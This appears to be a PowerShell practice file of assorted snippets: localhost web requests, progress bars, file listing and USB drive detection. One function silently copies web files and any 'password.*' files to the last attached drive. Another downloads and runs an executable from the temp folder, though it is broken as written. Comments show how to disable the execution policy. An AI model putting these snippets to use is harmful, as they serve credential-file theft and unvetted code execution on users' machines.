<# //////////////////////// #>
function curl_POST {
    $data = @{
        name = "Tommy Vercetti";
        city = "Miami, Florida";
    }
    $response = Invoke-WebRequest -Method Post -Uri "http://localhost/curl1/post.php" -Headers @{"Content-Type" = "application/x-www-form-urlencoded";} -Body $data
    Write-Output $response
}

<# //////////////////////// #>
function curl_GET{
    $response = Invoke-WebRequest -Method Get -Uri "http://localhost/curl1/get.php?name=something&city=Miami+,Florida"
    Write-Output $response
}
<# //////////////////////// #>


function function_with_param {
    param (
        [Parameter][string]$arg1,
        [Parameter][string]$arg2 = "aaa"
    )
    Write-Host "$arg1 + $arg2"
}
<# //////////////////////// #>

function getLastUsbLetter{
    return ((Get-Partition -DiskNumber ((Get-Disk).Length - 1)).DriveLetter)
}

<# //////////////////////// #>


<# Set-ExecutionPolicy Unrestricted #>
# Line Above desactivates the "You must run a trusted Script System", MUST BE RUN WITH ADMIN PRIV!!!


<# //////////////////////// #>

function copyAll{
    $letter = (getLastUsbLetter)
    #$files = Get-ChildItem "C`:" -Recurse -Filter 
    #BackTick "`" is used as an escape character. 
    
    # For Multiple Filter/Exstentions,names ect.
    #$files = (Get-ChildItem "$($_.DeviceID)\" -ErrorAction SilentlyContinue -Recurse -Include ('*.txt','*.html') | Where-Object {$_.permission -match "read"})
    $files = (Get-ChildItem "$($_.DeviceID)\xampp" -Recurse -Include ('*.txt','*.html','*.php',"password.*"))
    foreach($file in $files){
        if ( (($file.Name).ToString()).EndsWith(".php") -eq 'True' ) 
        { Write-Host (($file.Directory).ToString() + "/" + ($file.Name).ToString()) -ForegroundColor Red}
        elseif ( (($file.Name).ToString()).EndsWith(".txt") -eq 'True' ) 
        { Write-Host (($file.Directory).ToString() + "/" + ($file.Name).ToString()) -ForegroundColor Blue}
        elseif ( (($file.Name).ToString()).EndsWith(".html") -eq 'True' ) 
        { Write-Host (($file.Directory).ToString() + "/" + ($file.Name).ToString()) -ForegroundColor Green }
        else {Write-Host (($file.Directory).ToString() + "/" + ($file.Name).ToString()) ; Start-Sleep(2)}
        # Write-Host (($file.Directory).ToString() + "/" + ($file.Name).ToString())
        Copy-Item -Path (($file.Directory).ToString() + "/" + ($file.Name).ToString()) -Destination ($letter + ":/" + "container") 
    }
}

function Copy_Multiple_Paths{
    $location = @(
        "C`:\xampp\install\",
        "C`:\xampp\licenses\",
        "C`:\xampp\mysql\",
        "C`:\xampp\perl\",
        "C`:\xampp\php\",
        "C`:\xampp\sendmail\"
    )
    $files = (Get-ChildItem -Path $location -Recurse -Include ('*.txt'))
    foreach($file in $files){
        Write-Host $file.FullName;
    }
}

function Add_Line(){
    Add-Content C:/something/../path/file.extension "string to add (escape character is backtick) so basically `n for new line. `t for tabulation ect.." 
}

function overwrite_text(){
    for($i = 0;$i -lt 100;$i++){
        Clear-Host # Clear-Host basically clears screen.
        Write-Host "You have $i Seconds left." -ForegroundColor Green
        Start-Sleep -Milliseconds 100 # Start-Sleep works with -Seconds and with -Miliseconds aswell.
    }
    Write-Progress # Write-Progress is a more suitable command for the matter of "Progress Achieved". But I have to condon more research.
}

function progress_bar(){
    for($i = 1;$i -lt 100;$i++){
        if(($i -eq 10) -or ($i -eq 70)){
            Write-Progress -Activity "Writing" -Status "Active..." -PercentComplete $i
            Start-Sleep(1)
        }else{
            Write-Progress -Activity "Writing" -Status "Active..." -PercentComplete $i -SecondsRemaining 10
        }
    }
    Write-Progress -Activity "Writing" -Status "Active..." -Completed
}

function download_extern(){
    (New-Object System.Net.WebClient).DownloadFile('localhost/file.exe');
    Start-Process "%TEMP%\file.exe"
}

# Set-ExecutionPolicy Unrestricted -Force (Force is used to ignore warnings ect and Force-Execute the command)


<#
$letter = (getLastUsbLetter)
$files = Get-ChildItem "G:" -Recurse -Filter "*.php"
foreach($file in $files){
    Write-Host $file.Name
}
Write-Host $files.Length
#>